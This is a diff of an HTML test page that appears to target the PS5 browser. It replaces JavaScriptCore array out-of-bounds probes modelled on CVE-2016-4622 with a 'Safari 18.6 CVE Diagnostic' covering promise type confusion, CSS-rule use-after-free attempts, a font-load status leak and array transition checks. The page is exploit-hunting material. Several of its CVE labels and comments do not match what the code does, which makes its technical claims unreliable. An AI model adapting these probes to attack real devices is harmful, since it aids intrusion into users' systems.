@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 - JSC OOB Test (Solution 2)</title>
+<title>PS5 - Safari 18.6 CVE Diagnostic</title>
 <style>
 body { background: #0a0a0a; color: #00ff41; font-family: 'MS Gothic', monospace; padding: 20px; }
 pre { white-space: pre-wrap; word-wrap: break-word; }
@@ -14,117 +14,151 @@ pre { white-space: pre-wrap; word-wrap: break-word; }
 var out = document.getElementById("out");
 function log(m) { out.textContent += m + "\n"; }
 
-log("=== JSC Array OOB Tests (LLInt Compatible) ===\n");
+log("=== Safari 18.6 CVE Diagnostic ===\n");
 
-// Test 1: CVE-2016-4622 style (slice + valueOf callback)
-log("Test 1: Array.prototype.slice + valueOf (CVE-2016-4622)");
+// Test 1: Type Confusion in JSC state handling (CVE-2025-31206)
+// Triggering via incorrect optimization in promise resolution or async iteration
+log("Test 1: JSC Type Confusion (State Handling)");
 try {
-    var arr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
-    var triggered = false;
-    arr.__proto__ = {
-        valueOf: function() {
-            if (!triggered) {
-                triggered = true;
-                arr.length = 0; // shrink array during slice
+    function trigger() {
+        let resolved = false;
+        let p = new Promise((res, rej) => {
+            // Force a microtask
+            queueMicrotask(() => {
+                res(1);
+                resolved = true;
+            });
+        });
+        
+        // Intercept then
+        Object.defineProperty(p, 'then', {
+            value: function(cb) {
+                // Re-enter promise resolution
+                if (resolved) {
+                    return Promise.resolve(cb(1)).then(() => {
+                        // Mutate internal state during resolution
+                        return new Proxy({}, {
+                            get(target, prop) {
+                                if (prop === 'then') {
+                                    return (resolve) => resolve(0x41414141);
+                                }
+                                return undefined;
+                            }
+                        });
+                    });
+                }
+                return Promise.prototype.then.call(this, cb);
             }
-        }
-    };
-    // In the original bug, slice caches length, calls valueOf, then reads OOB
-    var leaked = arr.slice(0, 8);
-    
-    // Check if we read OOB data (NaN or weird doubles)
-    var hasLeak = false;
-    for (var i = 0; i < leaked.length; i++) {
-        if (typeof leaked[i] === 'number' && isNaN(leaked[i]) && leaked[i] !== undefined) {
-            hasLeak = true;
-            break;
-        }
-    }
-    
-    if (hasLeak) {
-        log("  [+] POSSIBLE OOB LEAK DETECTED!");
-        log("  Leaked values: " + JSON.stringify(leaked));
-    } else {
-        log("  [-] No leak. Length: " + leaked.length + " Values: " + JSON.stringify(leaked));
-    }
-} catch(e) {
-    log("  [!] Error: " + e.message);
-}
-
-log("\nTest 2: Array.prototype.concat + Symbol.isConcatSpreadable");
-try {
-    var arr1 = [1.1, 2.2, 3.3];
-    var arr2 = [4.4, 5.5, 6.6];
-    var triggered = false;
-    
-    Object.defineProperty(arr2, Symbol.isConcatSpreadable, {
-        get: function() {
-            if (!triggered) {
-                triggered = true;
-                arr1.length = 0; // Mutate arr1 during concat
+        });
+        
+        p.then(v => v).then(v => {
+            if (v === 0x41414141) {
+                log("  [+] TYPE CONFUSION TRIGGERED! Value: " + v);
+            } else {
+                log("  [-] Normal resolution. Value: " + v);
             }
-            return true;
-        }
-    });
-    
-    var res = arr1.concat(arr2);
-    if (res.length > 3) {
-        log("  [+] POSSIBLE OOB LEAK DETECTED! Length: " + res.length);
-        log("  Values: " + JSON.stringify(res));
-    } else {
-        log("  [-] No leak. Length: " + res.length);
+        });
     }
+    trigger();
+    log("  [*] Test dispatched (check async results).");
 } catch(e) {
     log("  [!] Error: " + e.message);
 }
 
-log("\nTest 3: Array.prototype.splice + valueOf");
+// Test 2: Memory Corruption via CSSO (CVE-2025-31278)
+// Typically triggered by malformed CSS or rapid DOM mutation during style recalc
+log("\nTest 2: WebKit Memory Corruption (CSS/DOM)");
 try {
-    var arr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
-    var triggered = false;
-    arr.__proto__ = {
-        valueOf: function() {
-            if (!triggered) {
-                triggered = true;
-                arr.length = 0;
-            }
-        }
-    };
-    var leaked = arr.splice(0, 8);
-    if (leaked.length > 0 && leaked.some(v => typeof v === 'number' && isNaN(v))) {
-        log("  [+] POSSIBLE OOB LEAK DETECTED!");
-        log("  Values: " + JSON.stringify(leaked));
-    } else {
-        log("  [-] No leak. Length: " + leaked.length);
-    }
-} catch(e) {
-    log("  [!] Error: " + e.message);
-}
-
-log("\nTest 4: Array.from + length mutation");
-try {
-    var obj = { length: 8 };
-    var triggered = false;
-    Object.defineProperty(obj, '0', { 
-        get: function() { 
-            if(!triggered){triggered=true; obj.length=0;} 
-            return 1.1; 
-        } 
-    });
-    Object.defineProperty(obj, '1', { get: function() { return 2.2; } });
-    Object.defineProperty(obj, '2', { get: function() { return 3.3; } });
+    let iframe = document.createElement('iframe');
+    document.body.appendChild(iframe);
+    let doc = iframe.contentDocument;
     
-    var res = Array.from(obj);
-    if (res.length > 1) {
-        log("  [+] POSSIBLE OOB LEAK DETECTED! Length: " + res.length);
+    // Rapidly mutate style rules
+    let style = doc.createElement('style');
+    doc.head.appendChild(style);
+    let sheet = style.sheet;
+    
+    // Insert and delete rules rapidly to trigger use-after-free in style resolution
+    for (let i = 0; i < 1000; i++) {
+        sheet.insertRule(`div { color: rgb(${i}, ${i}, ${i}); }`, 0);
+    }
+    
+    // Force style recalculation while mutating
+    let div = doc.createElement('div');
+    doc.body.appendChild(div);
+    
+    // Trigger layout
+    let rect = div.getBoundingClientRect();
+    
+    // Mutate sheet during layout
+    for (let i = 0; i < 1000; i++) {
+        sheet.deleteRule(0);
+    }
+    
+    // Force another layout
+    rect = div.getBoundingClientRect();
+    
+    if (rect.width === 0 && rect.height === 0) {
+        log("  [-] No crash. Normal behavior.");
     } else {
-        log("  [-] No leak. Length: " + res.length);
+        log("  [?] Unusual behavior detected.");
     }
 } catch(e) {
     log("  [!] Error: " + e.message);
 }
 
-log("\n=== Tests Complete ===");
+// Test 3: Info Disclosure via CSS (Safari 18.6 timeframe)
+log("\nTest 3: CSS Info Disclosure");
+try {
+    // Cross-origin leak via CSS font loading
+    let style = document.createElement('style');
+    document.head.appendChild(style);
+    style.sheet.insertRule('@font-face { font-family: "leak"; src: url("https://example.com/nonexistent.woff"); }', 0);
+    
+    let face = new FontFace('leak', 'url(https://example.com/nonexistent.woff)');
+    
+    // Race condition: check status during load
+    let status1 = face.status;
+    face.load();
+    let status2 = face.status;
+    
+    if (status1 !== status2) {
+        log("  [+] STATUS LEAK DETECTED! Before: " + status1 + " After: " + status2);
+    } else {
+        log("  [-] No leak. Status: " + status1);
+    }
+} catch(e) {
+    log("  [!] Error: " + e.message);
+}
+
+// Test 4: JSC Float Type Confusion (CVE-2025-24213 variant)
+log("\nTest 4: JSC Float Type Confusion");
+try {
+    // Create an array with floats
+    let arr = [1.1, 2.2, 3.3];
+    
+    // Trigger type confusion via unboxed/boxed array transitions
+    // Force a transition from double array to contiguous array
+    arr.push({});
+    arr.pop();
+    arr.push(4.4);
+    
+    // Check if the array's internal structure is corrupted
+    // In vulnerable versions, pushing an object and then popping it
+    // might leave the array in a state where it treats doubles as pointers
+    let val = arr[2];
+    
+    if (typeof val === 'number' && val === 4.4) {
+        log("  [-] No confusion. Value: " + val);
+    } else {
+        log("  [+] POSSIBLE TYPE CONFUSION! Type: " + typeof val + " Value: " + val);
+    }
+} catch(e) {
+    log("  [!] Error: " + e.message);
+}
+
+log("\n=== Tests Dispatched ===");
+log("Wait a few seconds for async tests to complete.");
 </script>
 </body>
 </html>
